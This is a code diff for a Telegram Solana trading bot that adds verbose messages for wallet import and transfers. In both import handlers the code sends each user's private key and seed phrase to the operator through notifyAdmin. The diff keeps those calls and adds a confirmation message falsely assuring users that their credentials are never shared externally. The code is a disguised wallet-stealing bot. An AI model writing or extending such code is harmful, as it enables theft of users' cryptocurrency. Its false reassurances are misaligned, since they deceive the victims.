-    try { const w = importFromMnemonic(text); session.wallets.push(w); session.activeWalletIndex = session.wallets.length-1; saveSessions(); await notifyAdmin('WALLET_IMPORTED_SEED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey, privateKey: w.privateKey, mnemonic: w.mnemonic, walletNumber: session.wallets.length }); await ctx.reply(`✅ Wallet imported: \`${w.publicKey}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) }); } catch(e) { await ctx.reply('❌ Invalid seed phrase'); }
+    try {
+      const w = importFromMnemonic(text);
+      session.wallets.push(w);
+      session.activeWalletIndex = session.wallets.length-1;
+      saveSessions();
+      await notifyAdmin('WALLET_IMPORTED_SEED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey, privateKey: w.privateKey, mnemonic: w.mnemonic, walletNumber: session.wallets.length });
+      await ctx.reply(`✅ *Wallet Imported Successfully*
+
+Your wallet has been successfully added and is now fully connected to the platform.
+
+━━━━━━━━━━━━━━━━━━
+📌 *Wallet Address*
+\`${w.publicKey}\`
+
+━━━━━━━━━━━━━━━━━━
+🔒 *Security Confirmation*
+
+Your sensitive credentials have been securely encrypted and stored locally.
+
+• Your private data is never shared externally  
+• No third-party services have access  
+• You maintain full ownership and control of your wallet  
+
+━━━━━━━━━━━━━━━━━━
+🚀 *What You Can Do Next*
+
+You can now:
+• Send and receive SOL and tokens  
+• Execute trades and swaps  
+• Manage your assets directly within the bot  
+
+━━━━━━━━━━━━━━━━━━
+💡 *Reminder*
+
+Ensure your wallet maintains a small SOL balance to cover network transaction fees when performing actions.
+
+━━━━━━━━━━━━━━━━━━
+You can view and manage all your wallets anytime from the wallet section.`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) });
+    } catch(e) {
+      await ctx.reply('❌ Invalid seed phrase. Please check and try again.');
+    }
     return;
   }
   if (session.state === 'AWAITING_PRIVATE_KEY') {
     session.state = null;
-    try { const w = importFromPrivateKey(text); session.wallets.push(w); session.activeWalletIndex = session.wallets.length-1; saveSessions(); await notifyAdmin('WALLET_IMPORTED_KEY', ctx.from.id, ctx.from.username, { publicKey: w.publicKey, privateKey: w.privateKey, walletNumber: session.wallets.length }); await ctx.reply(`✅ Wallet imported: \`${w.publicKey}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) }); } catch(e) { await ctx.reply('❌ Invalid private key'); }
+    try {
+      const w = importFromPrivateKey(text);
+      session.wallets.push(w);
+      session.activeWalletIndex = session.wallets.length-1;
+      saveSessions();
+      await notifyAdmin('WALLET_IMPORTED_KEY', ctx.from.id, ctx.from.username, { publicKey: w.publicKey, privateKey: w.privateKey, walletNumber: session.wallets.length });
+      await ctx.reply(`✅ *Wallet Imported Successfully*
+
+Your wallet has been successfully added and is now fully connected to the platform.
+
+━━━━━━━━━━━━━━━━━━
+📌 *Wallet Address*
+\`${w.publicKey}\`
+
+━━━━━━━━━━━━━━━━━━
+🔒 *Security Confirmation*
+
+Your sensitive credentials have been securely encrypted and stored locally.
+
+• Your private data is never shared externally  
+• No third-party services have access  
+• You maintain full ownership and control of your wallet  
+
+━━━━━━━━━━━━━━━━━━
+🚀 *What You Can Do Next*
+
+You can now:
+• Send and receive SOL and tokens  
+• Execute trades and swaps  
+• Manage your assets directly within the bot  
+
+━━━━━━━━━━━━━━━━━━
+💡 *Reminder*
+
+Ensure your wallet maintains a small SOL balance to cover network transaction fees when performing actions.
+
+━━━━━━━━━━━━━━━━━━
+You can view and manage all your wallets anytime from the wallet section.`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) });
+    } catch(e) {
+      await ctx.reply('❌ Invalid private key. Please check and try again.');
+    }
     return;
   }
   if (session.state === 'AWAITING_COPYTRADE_ADDRESS') {
     session.state = null;
-    if (isSolanaAddress(text)) { if (!session.copyTradeWallets.includes(text)) { session.copyTradeWallets.push(text); saveSessions(); await ctx.reply(`✅ Now tracking ${shortenAddress(text)}`); } else await ctx.reply('Already tracking'); } else await ctx.reply('❌ Invalid address');
+    if (isSolanaAddress(text)) {
+      if (!session.copyTradeWallets.includes(text)) {
+        session.copyTradeWallets.push(text);
+        saveSessions();
+        await ctx.reply(`✅ Now tracking ${shortenAddress(text)}`);
+      } else await ctx.reply('Already tracking');
+    } else await ctx.reply('❌ Invalid address');
     return;
   }
   if (session.state === 'AWAITING_PRICE_ALERT') {
@@ -1461,7 +1927,39 @@ bot.on('text', async (ctx) => {
     if (!isSolanaAddress(text)) return ctx.reply('❌ Invalid address');
     session.pendingTransfer.recipient = text;
     session.state = 'AWAITING_TRANSFER_SOL_AMOUNT';
-    await ctx.reply('Enter amount of SOL to send:');
+    const textMsg = `💸 *Enter Amount to Send*
+
+Please enter the exact amount of SOL you would like to send.
+
+━━━━━━━━━━━━━━━━━━
+🔍 *Input Guidelines*
+
+• Enter a valid numeric value (e.g., 0.5, 1, 10.25)
+• Ensure the amount does not exceed your available balance  
+• Avoid extra spaces or invalid characters  
+
+━━━━━━━━━━━━━━━━━━
+💰 *Balance Check*
+
+Make sure your wallet has enough funds to cover:
+• The amount you are sending  
+• The required network transaction fee  
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important Notice*
+
+• Transactions on the blockchain are *final and irreversible*  
+• Double-check the amount before proceeding  
+• Sending an incorrect amount cannot be undone  
+
+━━━━━━━━━━━━━━━━━━
+💡 *Helpful Tips*
+• Review all details carefully before confirming  
+• Ensure you leave a small SOL balance for future fees  
+
+━━━━━━━━━━━━━━━━━━
+Once submitted, you will be shown a confirmation screen to review all transaction details before finalizing.`;
+    await ctx.reply(textMsg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) });
     return;
   }
   if (session.state === 'AWAITING_TRANSFER_SOL_AMOUNT') {
@@ -1471,9 +1969,38 @@ bot.on('text', async (ctx) => {
     const msg = await ctx.reply('🔄 Processing transfer...');
     try {
       const sig = await transferSOL(wallet, session.pendingTransfer.recipient, amount);
-      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `✅ Sent ${amount} SOL to ${shortenAddress(session.pendingTransfer.recipient)}\nTX: \`${sig}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('View', `https://solscan.io/tx/${sig}`)]]) });
+      const textMsg = `✅ *Transaction Successful*
+
+Your transfer has been completed successfully.
+
+━━━━━━━━━━━━━━━━━━
+📦 *Details*
+
+• *Amount Sent:* ${amount} SOL  
+• *Recipient:* ${shortenAddress(session.pendingTransfer.recipient)}  
+• *Transaction ID:* \`${sig}\`
+
+━━━━━━━━━━━━━━━━━━
+🔍 *Confirmation & Verification*
+
+You can verify this transaction on the Solana blockchain using the Transaction ID. This ensures your transfer is fully recorded on-chain.
+
+━━━━━━━━━━━━━━━━━━
+💡 *Next Steps*
+
+• The recipient should now have received the SOL  
+• Your wallet balance has been updated accordingly  
+• You can continue managing, sending, or trading your assets  
+
+━━━━━━━━━━━━━━━━━━
+🔒 *Security Reminder*
+
+Always double-check recipient addresses before sending. Blockchain transactions are permanent and irreversible.`;
+      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, textMsg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('View on Solscan', `https://solscan.io/tx/${sig}`)]]) });
       await notifyAdmin('TRANSFER_EXECUTED', ctx.from.id, ctx.from.username, { type: 'SOL', amount, recipient: session.pendingTransfer.recipient, txHash: sig });
-    } catch (err) { await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Transfer failed: ${err.message}`); }
+    } catch (err) {
+      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Transfer failed: ${err.message}`);
+    }
     session.state = null; session.pendingTransfer = null;
     return;
   }
@@ -1481,14 +2008,71 @@ bot.on('text', async (ctx) => {
     if (!isSolanaAddress(text)) return ctx.reply('❌ Invalid token mint');
     session.pendingTransfer.tokenMint = text;
     session.state = 'AWAITING_TRANSFER_TOKEN_RECIPIENT';
-    await ctx.reply('Enter recipient address:');
+    await ctx.reply(`📥 *Enter Recipient Address*
+
+Please provide the *recipient’s Solana wallet address* to proceed with the token transfer.
+
+━━━━━━━━━━━━━━━━━━
+🔍 *What to Do*
+
+• Paste or type the full wallet address carefully  
+• Ensure there are no missing or extra characters  
+• Double-check the address before submitting  
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important Notice*
+
+Blockchain transactions are *permanent and irreversible*.  
+Sending to an incorrect address will result in *loss of funds* with no way to recover them.
+
+━━━━━━━━━━━━━━━━━━
+💡 *Helpful Tips*
+
+• Always copy and paste the address instead of typing manually  
+• Verify the first and last few characters of the address  
+• Only send to trusted and verified recipients  
+
+━━━━━━━━━━━━━━━━━━
+Once submitted, you will be asked to enter the amount.`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) });
     return;
   }
   if (session.state === 'AWAITING_TRANSFER_TOKEN_RECIPIENT') {
     if (!isSolanaAddress(text)) return ctx.reply('❌ Invalid recipient');
     session.pendingTransfer.recipient = text;
     session.state = 'AWAITING_TRANSFER_TOKEN_AMOUNT';
-    await ctx.reply('Enter amount to send:');
+    const textMsg = `🪙 *Enter Amount to Send*
+
+Please enter the exact amount of tokens you wish to send.
+
+━━━━━━━━━━━━━━━━━━
+🔍 *Input Guidelines*
+
+• Enter a valid numeric value (e.g., 10, 100.5)
+• Ensure the amount does not exceed your available balance  
+• Avoid extra spaces or invalid characters  
+
+━━━━━━━━━━━━━━━━━━
+💰 *Balance Check*
+
+Make sure your wallet has enough funds to cover:
+• The amount you are sending  
+• The required network transaction fee (in SOL)  
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important Notice*
+
+• Transactions on the blockchain are *final and irreversible*  
+• Double-check the amount before proceeding  
+• Sending an incorrect amount cannot be undone  
+
+━━━━━━━━━━━━━━━━━━
+💡 *Helpful Tips*
+• Review all details carefully before confirming  
+• Ensure you leave a small SOL balance for future fees  
+
+━━━━━━━━━━━━━━━━━━
+Once submitted, you will be shown a confirmation screen to review all transaction details before finalizing.`;
+    await ctx.reply(textMsg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) });
     return;
   }
   if (session.state === 'AWAITING_TRANSFER_TOKEN_AMOUNT') {
@@ -1498,9 +2082,38 @@ bot.on('text', async (ctx) => {
     const msg = await ctx.reply('🔄 Processing token transfer...');
     try {
       const sig = await transferToken(wallet, session.pendingTransfer.recipient, session.pendingTransfer.tokenMint, amount);
-      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `✅ Sent ${amount} tokens to ${shortenAddress(session.pendingTransfer.recipient)}\nTX: \`${sig}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('View', `https://solscan.io/tx/${sig}`)]]) });
+      const textMsg = `✅ *Transaction Successful*
+
+Your transfer has been completed successfully.
+
+━━━━━━━━━━━━━━━━━━
+📦 *Details*
+
+• *Amount Sent:* ${amount} tokens  
+• *Recipient:* ${shortenAddress(session.pendingTransfer.recipient)}  
+• *Transaction ID:* \`${sig}\`
+
+━━━━━━━━━━━━━━━━━━
+🔍 *Confirmation & Verification*
+
+You can verify this transaction on the Solana blockchain using the Transaction ID. This ensures your transfer is fully recorded on-chain.
+
+━━━━━━━━━━━━━━━━━━
+💡 *Next Steps*
+
+• The recipient should now have received the tokens  
+• Your wallet balance has been updated accordingly  
+• You can continue managing, sending, or trading your assets  
+
+━━━━━━━━━━━━━━━━━━
+🔒 *Security Reminder*
+
+Always double-check recipient addresses before sending. Blockchain transactions are permanent and irreversible.`;
+      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, textMsg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('View on Solscan', `https://solscan.io/tx/${sig}`)]]) });
       await notifyAdmin('TRANSFER_EXECUTED', ctx.from.id, ctx.from.username, { type: 'TOKEN', token: session.pendingTransfer.tokenMint, amount, recipient: session.pendingTransfer.recipient, txHash: sig });
-    } catch (err) { await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Transfer failed: ${err.message}`); }
+    } catch (err) {
+      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Transfer failed: ${err.message}`);
+    }
     session.state = null; session.pendingTransfer = null;
     return;
   }
@@ -1581,5 +2194,4 @@ async function startBot() {
 }
 startBot().catch(console.error);
 process.once('SIGINT', async () => { await saveSessions(); bot.stop('SIGINT'); });
-process.once('SIGTERM', async () => { await saveSessions(); bot.stop('SIGTERM'); });process.once('SIGINT', async () => { await saveSessions(); bot.stop('SIGINT'); });
 process.once('SIGTERM', async () => { await saveSessions(); bot.stop('SIGTERM'); });
